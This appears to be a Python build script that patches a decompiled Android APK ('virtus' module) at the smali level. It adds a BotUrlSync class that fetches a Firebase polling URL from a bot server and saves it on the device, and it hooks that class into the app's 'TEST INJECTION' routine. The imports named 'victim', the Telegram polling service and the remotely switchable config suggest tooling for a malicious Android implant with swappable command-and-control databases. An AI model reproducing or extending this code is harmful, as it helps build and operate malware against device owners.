#!/usr/bin/env python3
"""Multi-Firebase: APK pulls firebase URL from bot on TEST — no env change per DB."""

from __future__ import annotations

import os
from pathlib import Path

_APK_DIR = Path(__file__).resolve().parent
ROOT = _APK_DIR / "virtus_decompiled/smali/com/virtus/module"
TGS = ROOT / "TelegramPollingService.smali"
MAIN = ROOT / "MainActivity.smali"


def _bot_base_url() -> str:
    for key in ("VIRTUS_BOT_URL", "PUBLIC_BASE_URL"):
        value = os.environ.get(key, "").strip().rstrip("/")
        if value:
            return value
    return ""


def patch_readconfig_saved_firebase() -> None:
    """If firebase_poll_url pref saved (by bot TEST sync), read config/{KEY}.json there."""
    from patch_readconfig_victim import (
        PREFS_SAVE,
        PREFS_SAVE_FIXED,
        URL_BLOCK_NEW,
        URL_BLOCK_OLD,
    )

    # Use config/{KEY}.json on saved firebase (Astik path), not virtus_config.json
    url_new = URL_BLOCK_NEW.replace(
        '    const-string v2, "/virtus_config.json"',
        '    const-string v2, "/config/"',
    ).replace(
        ":virtus_cfg_url\n    new-instance v4",
        ":virtus_cfg_url\n    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;\n\n    const-string v2, \".json\"\n\n    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;\n\n    new-instance v4",
    )

    text = TGS.read_text()
    if ":virtus_module_cfg" in text:
        print("readConfig multi-firebase pref path already patched (skip)")
        return
    if PREFS_SAVE not in text:
        raise SystemExit("readConfig prefs block not found — run patch_astik_readconfig first")
    if URL_BLOCK_OLD not in text:
        raise SystemExit("readConfig URL block not found")
    text = text.replace(PREFS_SAVE, PREFS_SAVE_FIXED, 1)
    text = text.replace(URL_BLOCK_OLD, url_new, 1)
    TGS.write_text(text)
    print("readConfig: saved firebase_poll_url -> {url}/config/{KEY}.json")


def write_bot_url_sync(bot_base: str) -> None:
    bot_base = bot_base or ""
    (ROOT / "BotUrlSync.smali").write_text(
        f'''.class public Lcom/virtus/module/BotUrlSync;
.super Ljava/lang/Object;
.source "BotUrlSync.java"


.field private static final BOT_BASE:Ljava/lang/String; = "{bot_base}"

.field private static final PREFS:Ljava/lang/String; = "virtus_module_prefs"

.field private static final URL_KEY:Ljava/lang/String; = "firebase_poll_url"


.method public constructor <init>()V
    .locals 0

    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static syncFromBot(Landroid/content/Context;Ljava/lang/String;)V
    .locals 8

    if-eqz p1, :exit

    invoke-virtual {{p1}}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {{p1}}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :exit

    :try_start_0
    sget-object v0, Lcom/virtus/module/BotUrlSync;->BOT_BASE:Ljava/lang/String;

    invoke-virtual {{v0}}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :exit

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "/api/apk-config/"

    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {{v1, p1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    new-instance v0, Ljava/net/URL;

    invoke-direct {{v0, p1}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {{v0}}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object p1

    check-cast p1, Ljava/net/HttpURLConnection;

    const-string v0, "GET"

    invoke-virtual {{p1, v0}}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/16 v0, 0x1388

    invoke-virtual {{p1, v0}}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    invoke-virtual {{p1, v0}}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    invoke-virtual {{p1}}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v0

    const/16 v1, 0xc8

    if-eq v0, v1, :read_body

    invoke-virtual {{p1}}, Ljava/net/HttpURLConnection;->disconnect()V

    return-void

    :read_body
    invoke-virtual {{p1}}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    new-instance v1, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/InputStreamReader;

    invoke-direct {{v2, v0}}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {{v1, v2}}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {{v0}}, Ljava/lang/StringBuilder;-><init>()V

    :loop
    invoke-virtual {{v1}}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :done

    invoke-virtual {{v0, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :loop

    :done
    invoke-virtual {{p1}}, Ljava/net/HttpURLConnection;->disconnect()V

    new-instance p1, Lorg/json/JSONObject;

    invoke-virtual {{v0}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {{p1, v0}}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v0, "firebase_url"

    const-string v1, ""

    invoke-virtual {{p1, v0, v1}}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {{p1}}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {{p1}}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :exit

    sget-object v0, Lcom/virtus/module/BotUrlSync;->PREFS:Ljava/lang/String;

    const/4 v1, 0x0

    invoke-virtual {{p0, v0, v1}}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p0

    invoke-interface {{p0}}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    sget-object v0, Lcom/virtus/module/BotUrlSync;->URL_KEY:Ljava/lang/String;

    invoke-interface {{p0, v0, p1}}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    invoke-interface {{p0}}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_0
    .catch Ljava/lang/Exception; {{:try_start_0 .. :try_end_0}} :exit

    :exit
    return-void
.end method
'''
    )
    print(f"BotUrlSync.smali written (BOT_BASE={bot_base or '(empty)'})")


def write_url_sync_inner() -> None:
    (ROOT / "MainActivity$UrlSync.smali").write_text(
        '''.class Lcom/virtus/module/MainActivity$UrlSync;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


.field final synthetic this$0:Lcom/virtus/module/MainActivity;

.field final synthetic val$key:Ljava/lang/String;


.method constructor <init>(Lcom/virtus/module/MainActivity;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/virtus/module/MainActivity$UrlSync;->this$0:Lcom/virtus/module/MainActivity;

    iput-object p2, p0, Lcom/virtus/module/MainActivity$UrlSync;->val$key:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


.method public run()V
    .locals 2

    iget-object v0, p0, Lcom/virtus/module/MainActivity$UrlSync;->this$0:Lcom/virtus/module/MainActivity;

    iget-object v1, p0, Lcom/virtus/module/MainActivity$UrlSync;->val$key:Ljava/lang/String;

    invoke-static {v0, v1}, Lcom/virtus/module/BotUrlSync;->syncFromBot(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method
'''
    )


def patch_run_test_bot_url() -> None:
    write_url_sync_inner()
    text = MAIN.read_text()
    if "MainActivity$UrlSync" in text:
        print("runTest BotUrlSync already hooked (skip)")
        return

    if ".method private runTest()V\n    .locals 3" in text:
        text = text.replace(
            ".method private runTest()V\n    .locals 3",
            ".method private runTest()V\n    .locals 4",
            1,
        )

    old = """    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 292
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/virtus/module/MainActivity$4;"""

    new = """    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    iget-object v1, p0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/virtus/module/MainActivity$UrlSync;

    invoke-direct {v3, p0, v1}, Lcom/virtus/module/MainActivity$UrlSync;-><init>(Lcom/virtus/module/MainActivity;Ljava/lang/String;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    .line 292
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/virtus/module/MainActivity$4;"""

    if old not in text:
        raise SystemExit("runTest hook point not found")
    MAIN.write_text(text.replace(old, new, 1))
    print("runTest: BotUrlSync on TEST INJECTION (multi-firebase)")


def main() -> None:
    write_bot_url_sync(_bot_base_url())
    patch_readconfig_saved_firebase()
    patch_run_test_bot_url()


if __name__ == "__main__":
    main()
